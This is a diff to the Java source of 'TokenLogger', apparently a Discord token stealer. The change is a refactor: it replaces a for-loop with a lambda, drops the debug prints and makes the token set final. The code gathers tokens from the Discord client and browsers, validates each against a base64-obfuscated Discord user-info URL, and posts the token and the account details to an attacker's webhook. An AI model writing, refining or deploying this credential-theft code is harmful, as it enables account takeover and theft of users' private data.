@@ -9,7 +9,7 @@ import tokenlogger.utils.*;
 import static tokenlogger.config.Config.*;
 
 public class TokenLogger {
-    private static Set<String> tokens = new HashSet<>();
+    private static final Set<String> tokens = new HashSet<>();
     public static final String USER_INFO_URL = Decryptor.decode("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjkvdXNlcnMvQG1l");
 
     public static void main(String[] args) {
@@ -28,15 +28,13 @@ public class TokenLogger {
 
         getClientTokens();
         getBrowserTokens();
-        for (String token : tokens) {
-            System.out.println("Token: " + token);
-
+        tokens.forEach(token -> {
             String userInfo = Requests.get(USER_INFO_URL, token);
-            System.out.println("User Info: " + userInfo);
-            if (userInfo != null) {
-                Requests.post(EmbedGenerator.generateEmbed(userInfo, token), WEBHOOK_URL);
-            }
-        }
+            if (userInfo == null) return;
+            String infoEmbed = EmbedGenerator.generateEmbed(userInfo, token);
+            if (infoEmbed == null) return;
+            Requests.post(infoEmbed, WEBHOOK_URL);
+        });
 
         System.exit(0);
     }
